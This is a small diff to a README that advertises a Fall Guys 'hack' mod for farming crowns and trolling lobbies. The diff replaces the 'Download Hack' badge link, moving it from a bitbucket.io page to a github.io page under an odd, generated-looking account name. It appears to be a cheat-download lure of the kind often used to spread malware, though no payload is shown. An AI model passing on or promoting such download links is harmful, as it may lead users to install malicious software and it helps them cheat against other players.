@@ -4,7 +4,7 @@ Let’s face it: Fall Guys is fun... until you get grabbed at the finish line or
 
 Whether you're out here to farm crowns, troll the lobby, or just zoom around for fun, this mod turns your bean into a legend 😈
 
-[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://fileoffload16.bitbucket.io)
+[![Download Hack](https://img.shields.io/badge/Download-Hack-blueviolet)](https://Fall-Guys-Hack-kupiw.github.io/.github)
 ---
 
 ## 🧰 What’s in This Fall Guys Hack?
